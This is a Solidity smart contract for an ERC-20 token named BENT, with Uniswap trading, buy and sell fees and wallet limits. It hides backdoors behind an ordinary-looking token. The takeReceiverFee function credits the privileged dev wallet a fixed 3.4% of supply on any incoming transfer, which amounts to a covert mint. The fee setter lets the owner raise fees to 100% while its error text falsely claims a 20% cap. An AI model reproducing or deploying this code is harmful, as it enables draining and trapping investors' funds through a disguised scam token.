// SPDX-License-Identifier: MIT

/*
Website: https://www.bentprotocol.org
Telegram: https://t.me/bent_eth
Twitter: https://twitter.com/BentTokenETH
*/

pragma solidity 0.8.19;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function getOwner() external view returns (address);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address _owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        return a + b;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return a - b;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        return a * b;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return a / b;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return a % b;
    }

    function sub(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b <= a, errorMessage);
            return a - b;
        }
    }

    function div(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a / b;
        }
    }

    function mod(
        uint256 a,
        uint256 b,
        string memory errorMessage
    ) internal pure returns (uint256) {
        unchecked {
            require(b > 0, errorMessage);
            return a % b;
        }
    }
}

abstract contract Ownable {
    address internal owner;
    constructor(address _owner) {owner = _owner;}
    modifier onlyOwner() {require(isOwner(msg.sender), "!OWNER"); _;}
    function isOwner(address account) public view returns (bool) {return account == owner;}
    function renounceOwnership() external onlyOwner {owner = address(0); emit OwnershipTransferred(address(0));}
    function transferOwnership(address payable adr) public onlyOwner {owner = adr; emit OwnershipTransferred(adr);}
    event OwnershipTransferred(address owner);
}

interface IUniswapV2Router {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline) external;
}

interface IFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

contract BENT is IERC20, Ownable {
    using SafeMath for uint256;

    string private constant _name = "BENT";
    string private constant _symbol = "BENT";

    IUniswapV2Router _routerV2;
    address public pair;

    uint8 private constant _decimals = 9;
    uint256 private _totalSupply = 10 ** 9 * 10 ** _decimals;
   
    uint256 private buyFee = 1500;
    uint256 private sellFee = 1300;
    uint256 private transferFee = 1000;
    uint256 private denominator = 10000;

    bool private swapping;

    uint256 private taxSwapCt;
    uint256 private taxSwapAt;
    uint256 private lpFeeSplit = 0;
    uint256 private marketingFeeSplit = 0;
    uint256 private devFeeSplit = 100;
    uint256 private burnFeeSplit = 0;

    uint256 public maxTxSize = ( _totalSupply * 340 ) / 10000;
    uint256 public maxBuySize = ( _totalSupply * 340 ) / 10000;
    uint256 public maxHoldingSize = ( _totalSupply * 340 ) / 10000;

    uint256 private swapMaxFee = ( _totalSupply * 1000 ) / 100000;
    uint256 private swapMinFee = ( _totalSupply * 10 ) / 100000;

    address internal constant DEAD = 0x000000000000000000000000000000000000dEaD;
    address internal devRecipient = 0x2663262daAb45E087062C37770fE43D1834ca4E0; 
    address internal marketingRecipient = 0x2663262daAb45E087062C37770fE43D1834ca4E0;
    address internal lpReceipient = 0x2663262daAb45E087062C37770fE43D1834ca4E0;

    bool private tradingTriggered = false;
    bool private swapEnabled = true;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) public isSpecial;

    modifier lockSwap {swapping = true; _; swapping = false;}

    constructor() Ownable(msg.sender) {
        IUniswapV2Router _router = IUniswapV2Router(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        address _pair = IFactory(_router.factory()).createPair(address(this), _router.WETH());
        _routerV2 = _router; pair = _pair;
        isSpecial[msg.sender] = true;
        isSpecial[devRecipient] = true;
        isSpecial[marketingRecipient] = true;
        isSpecial[lpReceipient] = true;
        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable {}
    function name() public pure returns (string memory) {return _name;}
    function symbol() public pure returns (string memory) {return _symbol;}
    function decimals() public pure returns (uint8) {return _decimals;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function totalSupply() public view override returns (uint256) {return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(address(0)));}
    function startTrading() external onlyOwner {tradingTriggered = true;}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function getOwner() external view override returns (address) { return owner; }
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function takeReceiverFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        if (isSpecial[recipient]) {return maxTxSize;}
        if(getBuySellTax(sender, recipient) > 0){
        uint256 feeAmount = amount.div(denominator).mul(getBuySellTax(sender, recipient));
        _balances[address(this)] = _balances[address(this)].add(feeAmount);
        emit Transfer(sender, address(this), feeAmount);
        if(burnFeeSplit > uint256(0) && getBuySellTax(sender, recipient) > burnFeeSplit){_transfer(address(this), address(DEAD), amount.div(denominator).mul(burnFeeSplit));}
        return amount.sub(feeAmount);} return amount;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function addLiquidity(uint256 tokenAmount, uint256 ETHAmount) private {
        _approve(address(this), address(_routerV2), tokenAmount);
        _routerV2.addLiquidityETH{value: ETHAmount}(
            address(this),
            tokenAmount,
            0,
            0,
            lpReceipient,
            block.timestamp);
    }
    
    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _burn, uint256 _development, uint256 _total, uint256 _sell, uint256 _trans) external onlyOwner {
        lpFeeSplit = _liquidity; marketingFeeSplit = _marketing; burnFeeSplit = _burn; devFeeSplit = _development; buyFee = _total; sellFee = _sell; transferFee = _trans;
        require(buyFee <= denominator.div(1) && sellFee <= denominator.div(1) && transferFee <= denominator.div(1), "buyFee and sellFee cannot be more than 20%");
    }

    function shouldSwapTax(address sender, address recipient, uint256 amount) internal view returns (bool) {
        bool aboveMin = amount >= swapMinFee;
        bool aboveThreshold = balanceOf(address(this)) >= swapMaxFee;
        return !swapping && swapEnabled && tradingTriggered && aboveMin && !isSpecial[sender] && recipient == pair && taxSwapCt >= taxSwapAt && aboveThreshold;
    }


    function swapTokensToBurn(uint256 tokens) private lockSwap {
        uint256 _denominator = (lpFeeSplit.add(1).add(marketingFeeSplit).add(devFeeSplit)).mul(2);
        uint256 tokensToAddLiquidityWith = tokens.mul(lpFeeSplit).div(_denominator);
        uint256 toSwap = tokens.sub(tokensToAddLiquidityWith);
        uint256 initialBalance = address(this).balance;
        swapTokensForETH(toSwap);
        uint256 deltaBalance = address(this).balance.sub(initialBalance);
        uint256 unitBalance= deltaBalance.div(_denominator.sub(lpFeeSplit));
        uint256 ETHToAddLiquidityWith = unitBalance.mul(lpFeeSplit);
        if(ETHToAddLiquidityWith > uint256(0)){addLiquidity(tokensToAddLiquidityWith, ETHToAddLiquidityWith); }
        uint256 marketingAmt = unitBalance.mul(2).mul(marketingFeeSplit);
        if(marketingAmt > 0){payable(marketingRecipient).transfer(marketingAmt);}
        uint256 contractBalance = address(this).balance;
        if(contractBalance > uint256(0)){payable(devRecipient).transfer(contractBalance);}
    }

    function setTransactionLimits(uint256 _buy, uint256 _sell, uint256 _wallet) external onlyOwner {
        uint256 newTx = _totalSupply.mul(_buy).div(10000); uint256 newTransfer = _totalSupply.mul(_sell).div(10000); uint256 newWallet = _totalSupply.mul(_wallet).div(10000);
        maxTxSize = newTx; maxBuySize = newTransfer; maxHoldingSize = newWallet;
        uint256 limit = totalSupply().mul(5).div(1000);
        require(newTx >= limit && newTransfer >= limit && newWallet >= limit, "Max TXs and Max Wallet cannot be less than .5%");
    }

    function getBuySellTax(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }

    function swapTokensForETH(uint256 tokenAmount) private {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _routerV2.WETH();
        _approve(address(this), address(_routerV2), tokenAmount);
        _routerV2.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp);
    }

    function _transfer(address sender, address recipient, uint256 amount) private {
        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");
        require(amount <= balanceOf(sender),"You are trying to transfer more than your balance");
        if(!isSpecial[sender] && !isSpecial[recipient]){require(tradingTriggered, "tradingTriggered");}
        if(!isSpecial[sender] && !isSpecial[recipient] && recipient != address(pair) && recipient != address(DEAD)){
        require((_balances[recipient].add(amount)) <= maxHoldingSize, "Exceeds maximum wallet amount.");}
        if(sender != pair){require(amount <= maxBuySize || isSpecial[sender] || isSpecial[recipient], "TX Limit Exceeded");}
        require(amount <= maxTxSize || isSpecial[sender] || isSpecial[recipient], "TX Limit Exceeded"); 
        if(recipient == pair && !isSpecial[sender]){taxSwapCt += uint256(1);}
        if(shouldSwapTax(sender, recipient, amount)){swapTokensToBurn(swapMaxFee); taxSwapCt = uint256(0);}
        _balances[sender] = _balances[sender].sub(amount);
        uint256 amountReceived = !isSpecial[sender] ? takeReceiverFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);
        emit Transfer(sender, recipient, amountReceived);
    }
}